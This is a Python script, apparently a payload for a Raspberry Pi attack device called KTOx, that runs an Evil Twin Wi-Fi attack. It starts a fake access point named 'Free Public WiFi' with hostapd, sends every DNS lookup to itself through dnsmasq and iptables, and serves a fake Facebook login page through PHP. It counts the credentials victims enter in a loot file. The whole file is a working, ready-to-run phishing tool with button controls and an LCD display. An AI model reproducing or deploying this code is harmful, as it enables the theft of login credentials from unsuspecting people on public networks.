#!/usr/bin/env python3
"""
KTOx *payload* – **Evil Twin (Facebook Phishing)**
====================================================
This payload sets up an Evil Twin attack to phish for Facebook credentials.
It creates a fake Wi-Fi access point, redirects all DNS requests to a local
web server hosting a fake Facebook login page, and captures any entered
credentials.

Features:
- Creates a fake Wi-Fi AP with a configurable SSID and channel.
- Uses `hostapd` and `dnsmasq` for AP and DHCP/DNS services.
- Hosts a customizable phishing portal (default Facebook login page).
- Captures credentials to a loot file.
- Displays client count and captured credential count on the LCD.
- Graceful exit via KEY3 or Ctrl-C, cleaning up all attack processes
  and restoring network settings.

Controls:
- MAIN SCREEN:
    - OK: Start Evil Twin attack.
    - KEY1: Edit Fake AP SSID.
    - KEY2: Edit Fake AP Channel.
    - KEY3: Select Phishing Portal.
- PORTAL SELECTION SCREEN:
    - UP/DOWN: Navigate available phishing portals.
    - OK: Select portal.
    - KEY3: Cancel selection.
- ATTACKING SCREEN:
    - KEY3: Stop attack and exit.
"""
import sys
import os
import time
import signal
import subprocess
import threading

# ----------------------------
# KTOx PATH and ROOT check
# ----------------------------
def is_root():
    return os.geteuid() == 0

# Prefer installed KTOx path; fallback to repo-relative
PREFERRED_KTOX = '/root/KTOx'
if os.path.isdir(PREFERRED_KTOX):
    if PREFERRED_KTOX not in sys.path:
        sys.path.insert(0, PREFERRED_KTOX)
else:
    KTOX_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', '..', 'KTOx'))
    if os.path.isdir(KTOX_PATH) and KTOX_PATH not in sys.path:
        sys.path.insert(0, KTOX_PATH)

# ----------------------------
# Third-party library imports 
# ----------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_1in44, LCD_Config
    from PIL import Image, ImageDraw, ImageFont
except ImportError:
    print("ERROR: Hardware libraries (RPi.GPIO, LCD, PIL) not found.", file=sys.stderr)
    print("Please run 'sudo pip3 install RPi.GPIO spidev Pillow'.", file=sys.stderr)
    sys.exit(1)

# ----------------------------
# KTOx WiFi Integration
# ----------------------------
try:
    from wifi.ktox_integration import get_best_interface
    WIFI_INTEGRATION_AVAILABLE = True
except ImportError:
    WIFI_INTEGRATION_AVAILABLE = False
    def get_best_interface():
        return "wlan1" # Fallback

WIFI_INTERFACE = get_best_interface() # Hardcoded to wlan1 as per user request for evil twin attacks
FAKE_AP_SSID = "Free Public WiFi"
FAKE_AP_CHANNEL = "1"
KTOX_DIR = '/root/KTOx' if os.path.isdir('/root/KTOx') else os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', '..', 'KTOx'))
CAPTIVE_PORTAL_BASE_PATH = os.path.join(KTOX_DIR, "DNSSpoof", "sites")
CAPTIVE_PORTAL_PATH = os.path.join(CAPTIVE_PORTAL_BASE_PATH, "wifi")
LOOT_FILE = os.path.join(CAPTIVE_PORTAL_PATH, "loot.txt")
TEMP_CONF_DIR = "/tmp/ktox_eviltwin_facebook/"
# Ensure loot path exists
try:
    os.makedirs(os.path.dirname(LOOT_FILE), exist_ok=True)
except Exception:
    pass

current_html_file = "wifi"
html_files_list = []
html_file_index = 0

PINS = { "OK": 13, "KEY3": 16, "KEY1": 21, "KEY2": 20, "UP": 6, "DOWN": 19 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

running = True
attack_processes = {}
status_info = { "clients": 0, "credentials": 0 }
scroll_offset = 0
VISIBLE_ITEMS = 5 # Number of HTML files visible on screen at once

def cleanup(*_):
    global running
    if running:
        running = False
        for proc in attack_processes.values():
            try: os.killpg(os.getpgid(proc.pid), signal.SIGTERM) 
            except: pass
        attack_processes.clear()
        # Restore network settings
        subprocess.run("iptables -F; iptables -t nat -F", shell=True)
        subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
        subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True)
        subprocess.run(f"iwconfig {WIFI_INTERFACE} mode managed", shell=True) # Restore to managed mode
        subprocess.run(f"ifconfig {WIFI_INTERFACE} up", shell=True)
        subprocess.run("systemctl start NetworkManager", shell=True) # Restart NetworkManager
        subprocess.run("systemctl start wpa_supplicant", shell=True) # Restart wpa_supplicant
        if os.path.exists(TEMP_CONF_DIR): subprocess.run(f"rm -rf {TEMP_CONF_DIR}", shell=True)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

def draw_ui(screen_state="main", status: str = ""):
    img = Image.new("RGB", (128, 128), (10, 0, 0))
    d = ImageDraw.Draw(img)

    if screen_state == "main":
        d.text((5, 5), "Evil Twin (Facebook)", font=FONT_TITLE, fill="#1877f2")
        d.line([(0, 22), (128, 22)], fill="#1877f2", width=1)

        d.text((5, 30), f"SSID: {FAKE_AP_SSID}", font=FONT, fill=(242, 243, 244))
        d.text((5, 45), f"Channel: {FAKE_AP_CHANNEL}", font=FONT, fill=(242, 243, 244))
        d.text((5, 60), f"Portal: {current_html_file}", font=FONT, fill=(242, 243, 244))

        d.text((5, 80), "OK=Start | KEY1=Edit SSID", font=FONT, fill=(171, 178, 185))
        d.text((5, 95), "KEY2=Edit Channel", font=FONT, fill=(171, 178, 185))
        d.text((5, 110), "KEY3=Select Portal", font=FONT, fill=(171, 178, 185))
    elif screen_state == "html_select":
        d.text((5, 5), "Select Portal", font=FONT_TITLE, fill=(212, 172, 13))
        d.line([(0, 22), (128, 22)], fill=(212, 172, 13), width=1)

        if not html_files_list:
            d.text((5, 40), "No HTML files found!", font=FONT, fill="red")
        else:
            # Display scroll indicators if needed
            if scroll_offset > 0:
                d.text((60, 25), "^", font=FONT, fill=(242, 243, 244))
            if scroll_offset + VISIBLE_ITEMS < len(html_files_list):
                d.text((60, 100), "v", font=FONT, fill=(242, 243, 244))

            for i in range(VISIBLE_ITEMS):
                if scroll_offset + i < len(html_files_list):
                    file_name = html_files_list[scroll_offset + i]
                    display_name = file_name
                    if len(display_name) > 16:
                        display_name = display_name[:13] + "..."
                    
                    text_color = "white"
                    if (scroll_offset + i) == html_file_index:
                        text_color = "lime"
                        d.rectangle([(0, 35 + i*15), (128, 35 + (i+1)*15)], fill="blue")
                    d.text((5, 35 + i*15), display_name, font=FONT, fill=text_color)
        d.text((5, 110), "UP/DOWN=Select | OK=Confirm", font=FONT, fill=(171, 178, 185))
    elif screen_state == "attacking":
        status_color = "lime" if status == "ACTIVE" else "red"
        d.text((30, 25), status, font=FONT_TITLE, fill=status_color)
        d.text((5, 45), f"SSID: {FAKE_AP_SSID}", font=FONT, fill=(242, 243, 244))
        d.text((5, 60), f"Clients: {status_info['clients']}", font=FONT, fill=(212, 172, 13))
        d.text((5, 75), f"Creds: {status_info['credentials']}", font=FONT, fill="orange")
        d.text((5, 110), "Press KEY3 to Stop", font=FONT, fill=(171, 178, 185))
    elif screen_state == "error":
        d.text((5, 5), "ERROR", font=FONT_TITLE, fill="red")
        d.line([(0, 22), (128, 22)], fill="red", width=1)
        d.text((5, 30), status, font=FONT, fill=(242, 243, 244))
        d.text((5, 110), "Press OK to continue", font=FONT, fill=(171, 178, 185))
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_file_selection_logic():
    global html_files_list, html_file_index, current_html_file, CAPTIVE_PORTAL_PATH, LOOT_FILE, scroll_offset

    html_files_list = [d for d in os.listdir(CAPTIVE_PORTAL_BASE_PATH) if os.path.isdir(os.path.join(CAPTIVE_PORTAL_BASE_PATH, d))]
    html_files_list.sort()

    if not html_files_list:
        draw_ui("html_select")
        time.sleep(2)
        return

    try:
        html_file_index = html_files_list.index(current_html_file)
    except ValueError:
        html_file_index = 0
    
    # Adjust scroll_offset to ensure current_html_file is visible
    if html_file_index < scroll_offset:
        scroll_offset = html_file_index
    elif html_file_index >= scroll_offset + VISIBLE_ITEMS:
        scroll_offset = html_file_index - VISIBLE_ITEMS + 1

    while running:
        draw_ui("html_select")
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0:
                    time.sleep(0.05)
                break
        
        if btn == "UP":
            html_file_index = (html_file_index - 1 + len(html_files_list)) % len(html_files_list)
            if html_file_index < scroll_offset:
                scroll_offset = html_file_index
            current_html_file = html_files_list[html_file_index]
        elif btn == "DOWN":
            html_file_index = (html_file_index + 1) % len(html_files_list)
            if html_file_index >= scroll_offset + VISIBLE_ITEMS:
                scroll_offset = html_file_index - VISIBLE_ITEMS + 1
            current_html_file = html_files_list[html_file_index]
        elif btn == "OK":
            CAPTIVE_PORTAL_PATH = os.path.join(CAPTIVE_PORTAL_BASE_PATH, current_html_file)
            LOOT_FILE = os.path.join(CAPTIVE_PORTAL_PATH, "loot.txt")
            draw_ui("main")
            time.sleep(1)
            return
        elif btn == "KEY3":
            return
        
        time.sleep(0.1)

def start_attack():
    # Kill conflicting processes
    subprocess.run("pkill wpa_supplicant; pkill dnsmasq; pkill hostapd; pkill php", shell=True, capture_output=True)
    
    # Create temporary config directory
    os.makedirs(TEMP_CONF_DIR, exist_ok=True)
    
    # Configure hostapd
    hostapd_conf_path = os.path.join(TEMP_CONF_DIR, "hostapd.conf")
    with open(hostapd_conf_path, "w") as f: f.write(f"interface={WIFI_INTERFACE}\ndriver=nl80211\nssid={FAKE_AP_SSID}\nhw_mode=g\nchannel={FAKE_AP_CHANNEL}\n")
    
    # Configure dnsmasq
    dnsmasq_conf_path = os.path.join(TEMP_CONF_DIR, "dnsmasq.conf")
    with open(dnsmasq_conf_path, "w") as f: f.write(f"interface={WIFI_INTERFACE}\ndhcp-range=10.0.0.10,10.0.0.100,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\naddress=/#/10.0.0.1\n")
    
    # Clear old loot file if it exists
    if os.path.exists(LOOT_FILE): os.remove(LOOT_FILE)
    
    # Bring interface down, set to master mode, and bring up with static IP
    subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True)
    subprocess.run(f"iwconfig {WIFI_INTERFACE} mode master", shell=True)
    subprocess.run(f"ifconfig {WIFI_INTERFACE} up 10.0.0.1 netmask 255.255.255.0", shell=True)
    
    # Enable IP forwarding
    subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
    
    # Setup iptables for NAT and DNS redirection
    subprocess.run("iptables -F", shell=True)
    subprocess.run("iptables -t nat -F", shell=True)
    subprocess.run("iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 53", shell=True)
    subprocess.run("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 80", shell=True)
    subprocess.run(f"iptables -A FORWARD -i {WIFI_INTERFACE} -o eth0 -j ACCEPT", shell=True) # Assuming eth0 is internet-facing
    subprocess.run(f"iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE", shell=True) # Assuming eth0 is internet-facing

    # Start hostapd
    attack_processes['hostapd'] = subprocess.Popen(f"hostapd {hostapd_conf_path}", shell=True, preexec_fn=os.setsid, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    time.sleep(2)
    if attack_processes['hostapd'].poll() is not None:
        error_msg = attack_processes['hostapd'].stderr.read().decode().strip()
        print(f"ERROR: hostapd failed to start. Stderr: {error_msg}", file=sys.stderr)
        return False, f"hostapd failed: {error_msg[:50]}..."

    # Start dnsmasq
    attack_processes['dnsmasq'] = subprocess.Popen(f"dnsmasq -C {dnsmasq_conf_path} -d", shell=True, preexec_fn=os.setsid, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    time.sleep(2)
    if attack_processes['dnsmasq'].poll() is not None:
        error_msg = attack_processes['dnsmasq'].stderr.read().decode().strip()
        print(f"ERROR: dnsmasq failed to start. Stderr: {error_msg}", file=sys.stderr)
        return False, f"dnsmasq failed: {error_msg[:50]}..."

    # Start PHP web server
    attack_processes['php'] = subprocess.Popen(f"php -S 10.0.0.1:80 -t {CAPTIVE_PORTAL_PATH}", shell=True, preexec_fn=os.setsid, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    time.sleep(2)
    if attack_processes['php'].poll() is not None:
        error_msg = attack_processes['php'].stderr.read().decode().strip()
        print(f"ERROR: PHP web server failed to start. Stderr: {error_msg}", file=sys.stderr)
        return False, f"PHP failed: {error_msg[:50]}..."
    
    return True, ""

def monitor_status():
    while running:
        try:
            with open("/var/lib/misc/dnsmasq.leases", "r") as f: status_info["clients"] = len(f.readlines())
        except:
            status_info["clients"] = 0
        try:
            with open(LOOT_FILE, "r") as f: status_info["credentials"] = len(f.read().split("----\n")) -1
        except:
            status_info["credentials"] = 0
        time.sleep(5)

def check_dependencies():
    """Check for required command-line tools."""
    for dep in ["hostapd", "dnsmasq", "php"]:
        if subprocess.run(["which", dep], capture_output=True).returncode != 0:
            return dep
    return None

if __name__ == '__main__':
    if not is_root():
        print("ERROR: This script requires root privileges.", file=sys.stderr)
        # Attempt to display on LCD if possible
        try:
            LCD = LCD_1in44.LCD()
            LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
            img = Image.new("RGB", (128, 128), (10, 0, 0))
            d = ImageDraw.Draw(img)
            FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
            d.text((10, 40), "ERROR:\nRoot privileges\nrequired.", font=FONT_TITLE, fill="red")
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception as e:
            print(f"Could not display error on LCD: {e}", file=sys.stderr)
        sys.exit(1)

    dep_missing = check_dependencies()
    if dep_missing:
        draw_ui("error", f"{dep_missing} not found!")
        time.sleep(5)
        sys.exit(1)

    current_screen = "main"
    is_attacking = False
    try:
        last_button_press_time = 0
        BUTTON_DEBOUNCE_TIME = 0.3 # seconds

        while running:
            current_time = time.time()
            
            if current_screen == "main":
                draw_ui("main")
                if GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    current_screen = "html_select"
                    time.sleep(BUTTON_DEBOUNCE_TIME)
                elif GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    draw_ui("STARTING")
                    success, error_message = start_attack()
                    if success:
                        is_attacking = True
                        current_screen = "attacking"
                        threading.Thread(target=monitor_status, daemon=True).start()
                    else:
                        draw_ui("error", error_message)
                        while GPIO.input(PINS["OK"]) != 0: # Wait for user to acknowledge error
                            time.sleep(0.1)
                        current_screen = "main"
                    time.sleep(BUTTON_DEBOUNCE_TIME)
            elif current_screen == "html_select":
                handle_file_selection_logic()
                current_screen = "main"
                time.sleep(BUTTON_DEBOUNCE_TIME)
            elif current_screen == "attacking":
                draw_ui("attacking", "ACTIVE")
                if GPIO.input(PINS["OK"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    draw_ui("stopping")
                    cleanup()
                    is_attacking = False
                    current_screen = "main"
                    time.sleep(2)
                elif GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
                    last_button_press_time = current_time
                    cleanup()
                    break
            
            time.sleep(0.1)

    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        cleanup()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("SE Evil Twin (Facebook) payload finished.")
